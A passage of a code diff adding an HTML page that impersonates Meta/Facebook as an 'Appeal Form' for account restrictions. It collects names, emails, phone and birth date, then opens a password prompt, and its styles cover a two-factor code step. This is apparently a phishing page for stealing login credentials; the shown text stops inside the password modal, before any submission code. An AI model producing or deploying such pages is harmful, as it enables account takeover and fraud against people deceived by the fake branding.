@@ -1,0 +1,2724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Appeal Form</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/Hn19bEHYJbt.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.65;
+            color: #1c2b33;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .site-header {
+            background: #ffffff;
+            padding: 16px 20px;
+            text-align: center;
+            border-bottom: 1px solid #e4e6eb;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .site-header .logo {
+            height: 36px;
+            width: auto;
+        }
+
+        .site-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 24px 16px;
+        }
+
+        .form-card {
+            width: 100%;
+            max-width: 600px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            margin: auto;
+        }
+
+        .form-header {
+            background: #f7f8fa;
+            padding: 16px 24px;
+            border-bottom: 1px solid #e4e6eb;
+        }
+
+        .form-header h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1c2b33;
+        }
+
+        .form-body {
+            padding: 24px;
+        }
+
+        .form-intro {
+            background: #f7f8fa;
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            border-left: 4px solid #1877f2;
+        }
+
+        .form-intro p {
+            font-size: 15px;
+            color: #1c2b33;
+            line-height: 1.6;
+        }
+
+        .form-intro p strong {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1c2b33;
+            margin-bottom: 4px;
+        }
+
+        .form-group label .required {
+            color: #dc3545;
+            margin-left: 2px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="email"],
+        .form-group input[type="tel"],
+        .form-group textarea {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #1c2b33;
+            background: #ffffff;
+            transition: border-color 0.15s, box-shadow 0.15s;
+            outline: none;
+        }
+
+        .form-group input:focus,
+        .form-group textarea:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        }
+
+        .form-group input::placeholder,
+        .form-group textarea::placeholder {
+            color: #8a8d91;
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .phone-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .phone-wrapper input {
+            padding-left: 52px !important;
+        }
+
+        .flag-dropdown {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            z-index: 5;
+            cursor: pointer;
+            padding: 0 8px;
+            border-right: 1px solid #ccd0d5;
+        }
+
+        .flag-dropdown img {
+            width: 20px;
+            height: 14px;
+            border-radius: 2px;
+            object-fit: cover;
+        }
+
+        .flag-dropdown .arrow {
+            margin-left: 4px;
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 4px solid #555;
+        }
+
+        .country-list {
+            position: absolute;
+            top: calc(100% + 4px);
+            left: 0;
+            width: 280px;
+            max-height: 200px;
+            overflow-y: auto;
+            background: #fff;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 100;
+            display: none;
+        }
+
+        .country-list.open {
+            display: block;
+        }
+
+        .country-list .country-search {
+            padding: 8px 12px;
+            position: sticky;
+            top: 0;
+            background: #fff;
+            border-bottom: 1px solid #e4e6eb;
+        }
+
+        .country-list .country-search input {
+            width: 100%;
+            padding: 6px 10px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .country-list .country-search input:focus {
+            border-color: #1877f2;
+        }
+
+        .country-list .country-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .country-list .country-item:hover {
+            background: #f0f2f5;
+        }
+
+        .country-list .country-item.highlight {
+            background: #e8f0fe;
+        }
+
+        .country-list .country-item img {
+            width: 20px;
+            height: 14px;
+            border-radius: 2px;
+            object-fit: cover;
+        }
+
+        .country-list .country-item .country-name {
+            flex: 1;
+        }
+
+        .country-list .country-item .dial-code {
+            color: #65676b;
+        }
+
+        .dob-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+        }
+
+        .dob-grid input {
+            width: 100%;
+            padding: 10px 8px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #1c2b33;
+            background: #ffffff;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        .dob-grid input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        }
+
+        .dob-grid input::placeholder {
+            color: #8a8d91;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 4px;
+        }
+
+        .radio-group label {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-weight: 400;
+            font-size: 14px;
+            color: #1c2b33;
+            cursor: pointer;
+            line-height: 1.5;
+        }
+
+        .radio-group input[type="radio"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            min-width: 18px;
+            border: 2px solid #8a8d91;
+            border-radius: 50%;
+            margin-top: 1px;
+            position: relative;
+            cursor: pointer;
+            background: #fff;
+            outline: none;
+            flex-shrink: 0;
+        }
+
+        .radio-group input[type="radio"]:checked {
+            border-color: #1c2b33;
+        }
+
+        .radio-group input[type="radio"]:checked::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #1c2b33;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 16px 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            min-width: 18px;
+            border: 2px solid #8a8d91;
+            border-radius: 4px;
+            margin-top: 2px;
+            position: relative;
+            cursor: pointer;
+            background: #fff;
+            outline: none;
+            flex-shrink: 0;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked {
+            background: #1877f2;
+            border-color: #1877f2;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: #1c2b33;
+            cursor: pointer;
+            line-height: 1.5;
+        }
+
+        .checkbox-group label a {
+            color: #1877f2;
+        }
+
+        .checkbox-group label a:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            font-family: inherit;
+        }
+
+        .submit-btn:hover {
+            background: #166fe5;
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .site-footer {
+            text-align: center;
+            padding: 16px 20px;
+            color: #65676b;
+            font-size: 13px;
+            background: #ffffff;
+            border-top: 1px solid #e4e6eb;
+        }
+
+        .form-error {
+            display: none;
+            align-items: center;
+            gap: 4px;
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .form-error.visible {
+            display: flex;
+        }
+
+        .form-error svg {
+            width: 14px;
+            height: 14px;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal-box {
+            background: #fff;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 440px;
+            min-height: 480px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 40px 20px;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .modal-logo-top {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+
+        .modal-logo-top img {
+            width: 100%;
+            height: 100%;
+        }
+
+        .modal-content-center {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+            justify-content: center;
+        }
+
+        .modal-content-center>div {
+            width: 100%;
+        }
+
+        .modal-desc {
+            color: #1C1E21;
+            font-size: 14px;
+            margin-bottom: 7px;
+            text-align: center;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+            border: 1px solid #d4dbe3;
+            height: 40px;
+            padding: 0 11px;
+            border-radius: 10px;
+            background: #fff;
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: all 0.2s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #3b82f6;
+            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
+        }
+
+        .input-wrapper input {
+            width: calc(100% - 30px);
+            outline: none;
+            height: 100%;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        .input-wrapper input.error-input {
+            border-color: #ef4444;
+        }
+
+        .toggle-btn {
+            position: absolute;
+            top: 0;
+            right: 0;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            border: none;
+            outline: none;
+            background: transparent;
+            cursor: pointer;
+        }
+
+        .error-text {
+            color: #ef4444;
+            font-size: 12px;
+            margin-bottom: 8px;
+            min-height: 16px;
+            text-align: center;
+        }
+
+        .continue-btn {
+            width: 100%;
+            height: 40px;
+            background: #0064E0;
+            color: #fff;
+            border: none;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 20px;
+        }
+
+        .continue-btn:hover {
+            background: #0056c7;
+        }
+
+        .continue-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+            color: #1C1E21;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .modal-logo-bottom {
+            width: 100%;
+            margin-top: 16px;
+            text-align: center;
+            padding-top: 12px;
+            border-top: 1px solid #e4e6eb;
+        }
+
+        .modal-logo-bottom img {
+            height: 24px;
+            width: auto;
+            opacity: 0.8;
+        }
+
+        .tfa-header {
+            display: flex;
+            align-items: center;
+            color: #1C1E21;
+            gap: 6px;
+            font-size: 14px;
+            margin-bottom: 7px;
+            justify-content: center;
+        }
+
+        .tfa-dot {
+            width: 4px;
+            height: 4px;
+            background: #1C1E21;
+            border-radius: 5px;
+        }
+
+        .tfa-title {
+            font-size: 20px;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .tfa-desc {
+            color: #1C1E21;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .tfa-image {
+            background: transparent;
+            margin: 8px 0 16px 0;
+        }
+
+        .tfa-image img {
+            width: 100%;
+            border-radius: 12px;
+            border: 1px solid #e4e6eb;
+        }
+
+        .tfa-submit-btn {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .tfa-submit-btn.enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+
+        .tfa-try-another {
+            width: 100%;
+            margin-top: 16px;
+            color: #1C1E21;
+            text-align: center;
+            cursor: pointer;
+            background: transparent;
+            border-radius: 40px;
+            padding: 10px 20px;
+            border: 1px solid #d4dbe3;
+            font-size: 14px;
+        }
+
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 999999;
+            color: #000;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-overlay.show {
+            display: flex;
+        }
+
+        .success-circle {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 4px solid #0A84FF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+
+        .success-check {
+            width: 30px;
+            height: 15px;
+            border-left: 4px solid #0A84FF;
+            border-bottom: 4px solid #0A84FF;
+            transform: rotate(-45deg);
+            margin-top: -5px;
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .success-desc {
+            font-size: 15px;
+            color: #000;
+            line-height: 1.5;
+            max-width: 320px;
+        }
+
+        .success-desc strong {
+            font-weight: 600;
+        }
+
+        .tfa-hidden {
+            display: none !important;
+        }
+
+        .tfa-alternative {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .tfa-alternative.show {
+            display: block;
+        }
+
+        .tfa-alternative .alt-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1C1E21;
+            margin-bottom: 10px;
+        }
+
+        .tfa-alternative .alt-desc {
+            font-size: 14px;
+            color: #65676b;
+            margin-bottom: 16px;
+        }
+
+        .tfa-alternative .alt-btn {
+            display: inline-block;
+            padding: 10px 24px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 4px;
+            transition: background 0.2s;
+        }
+
+        .tfa-alternative .alt-btn:hover {
+            background: #166fe5;
+        }
+
+        .tfa-alternative .alt-btn.secondary {
+            background: #e4e6eb;
+            color: #1c2b33;
+        }
+
+        .tfa-alternative .alt-btn.secondary:hover {
+            background: #d4d6da;
+        }
+
+        @media (max-width: 640px) {
+            .site-content {
+                padding: 12px 8px;
+            }
+            .form-body {
+                padding: 16px;
+            }
+            .form-header {
+                padding: 12px 16px;
+            }
+            .dob-grid {
+                gap: 6px;
+            }
+            .modal-box {
+                padding: 30px 16px;
+                min-height: 400px;
+            }
+            .success-title {
+                font-size: 18px;
+            }
+            .success-desc {
+                font-size: 14px;
+            }
+            .tfa-title {
+                font-size: 18px;
+            }
+            .country-list {
+                width: 240px;
+                left: -20px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .dob-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+                gap: 4px;
+            }
+            .dob-grid input {
+                font-size: 12px;
+                padding: 6px 2px;
+            }
+            .radio-group label {
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="site-header">
+        <svg class="logo" viewBox="0 0 500 100" aria-label="Meta Logo">
+            <defs>
+                <linearGradient id="mg1" x1="124.38" x2="160.839" y1="99" y2="59.326">
+                    <stop offset=".427" stop-color="#0278F1"/>
+                    <stop offset=".917" stop-color="#0180FA"/>
+                </linearGradient>
+                <linearGradient id="mg2" x1="42" x2="-1.666" y1="4.936" y2="61.707">
+                    <stop offset=".427" stop-color="#0165E0"/>
+                    <stop offset=".917" stop-color="#0180FA"/>
+                </linearGradient>
+                <linearGradient id="mg3" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
+                    <stop stop-color="#0064E0"/>
+                    <stop offset=".656" stop-color="#0066E2"/>
+                    <stop offset="1" stop-color="#0278F1"/>
+                </linearGradient>
+            </defs>
+            <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"/>
+            <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"/>
+            <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#mg1)"/>
+            <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#mg2)"/>
+            <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#mg3)"/>
+        </svg>
+    </header>
+
+    <main class="site-content">
+        <div class="form-card">
+            <div class="form-header">
+                <h2 id="formTitle">Appeal Form</h2>
+            </div>
+            <div class="form-body">
+                <form id="appealForm" novalidate>
+                    <div class="form-intro">
+                        <p id="introText">
+                            <strong id="introStrong">Please explain why you believe the account restriction was applied in error.</strong>
+                            <span id="introDesc">Our teams and technologies work in multiple languages to ensure consistent enforcement of rules. You can contact us in your native language.</span>
+                        </p>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblFullName">Full Name <span class="required">*</span></label>
+                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+                        <div class="form-error" id="error-fullName">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errFullName">Please enter your full name.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblPageName">Page Name <span class="required">*</span></label>
+                        <input type="text" id="pageName" name="pageName" placeholder="Enter your page name" required>
+                        <div class="form-error" id="error-pageName">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errPageName">Please enter your page name.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblBusinessEmail">Business Email <span class="required">*</span></label>
+                        <input type="email" id="businessEmail" name="businessEmail" placeholder="Enter your business email" required>
+                        <div class="form-error" id="error-businessEmail">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errBusinessEmail">Please enter a valid business email.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblPersonalEmail">Personal Email <span class="required">*</span></label>
+                        <input type="email" id="personalEmail" name="personalEmail" placeholder="Enter your personal email" required>
+                        <div class="form-error" id="error-personalEmail">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errPersonalEmail">Please enter a valid personal email.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblPhone">Mobile Phone Number <span class="required">*</span></label>
+                        <div class="phone-wrapper">
+                            <div class="flag-dropdown" id="flagDropdown" onclick="toggleCountryDropdown()">
+                                <img id="selectedFlag" src="https://flagcdn.com/w20/eg.png" alt="EG">
+                                <span class="arrow"></span>
+                            </div>
+                            <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required>
+                            <ul class="country-list" id="countryList">
+                                <li class="country-search">
+                                    <input type="text" id="countrySearch" placeholder="Search for a country..." oninput="filterCountries()">
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="form-error" id="error-phone">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errPhone">Please enter a valid phone number (at least 7 digits).</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblDob">Date of Birth</label>
+                        <div class="dob-grid">
+                            <input type="number" id="day" placeholder="DD" min="1" max="31" oninput="if(this.value>31)this.value=31;if(this.value<1 && this.value!='')this.value=1">
+                            <input type="number" id="month" placeholder="MM" min="1" max="12" oninput="if(this.value>12)this.value=12;if(this.value<1 && this.value!='')this.value=1">
+                            <input type="number" id="year" placeholder="YYYY" min="1900" max="2026" oninput="if(this.value>2026)this.value=2026">
+                        </div>
+                        <div class="form-error" id="error-dob">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errDob">Please enter a valid date of birth.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label id="lblHappened">What do you think happened? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <label id="radio1">
+                                <input type="radio" name="happened" value="false_report">
+                                <span id="radio1Text">This situation may be the result of a false report or a potentially unfair complaint from a competitor.</span>
+                            </label>
+                            <label id="radio2">
+                                <input type="radio" name="happened" value="sent_in_error">
+                                <span id="radio2Text">This notification may have been sent in error and may not accurately reflect the current status of the account.</span>
+                            </label>
+                            <label id="radio3">
+                                <input type="radio" name="happened" value="other">
+                                <span id="radio3Text">No fraud / other legal reason:</span>
+                            </label>
+                        </div>
+                        <div class="form-error" id="error-happened">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                            <span id="errHappened">Please select an option.</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <textarea id="otherDetails" name="otherDetails" rows="4" placeholder="Please describe the details..."></textarea>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="agreePolicy" required>
+                        <label id="lblAgree" for="agreePolicy">
+                            I agree to the <a href="#" id="privacyLink">Privacy Policy</a>
+                        </label>
+                    </div>
+                    <div class="form-error" id="error-agree">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                        <span id="errAgree">You must agree to the Privacy Policy.</span>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <span id="btnText">Submit Appeal</span>
+                        <span id="btnSpinner" class="loading-spinner" style="display:none;"></span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- PASSWORD MODAL -->
+    <div class="modal-overlay" id="passwordModal">
+        <div class="modal-box">
+            <div class="modal-logo-top">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877f2'%3E%3Cpath d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E" alt="Facebook" style="width:50px;height:50px;">
+            </div>
+            <div class="modal-content-center">
+                <div>
+                    <p class="modal-desc" id="pwdDesc">For security reasons, you must enter your password to continue.</p>
+                    <form id="passwordForm">
+                        <div class="input-wrapper" id="pwdWrapper">
+                            <input type="password" id="passwordInput" placeholder="Password" autocomplete="new-password">
+                            <button type="button" class="toggle-btn" onclick="togglePassword()">
+                                <svg id="eyeOff" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"/><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"/><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"/><path d="m2 2 20 20"/></svg>
+                                <svg id="eyeOn" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+                            </button>
+                        </div>
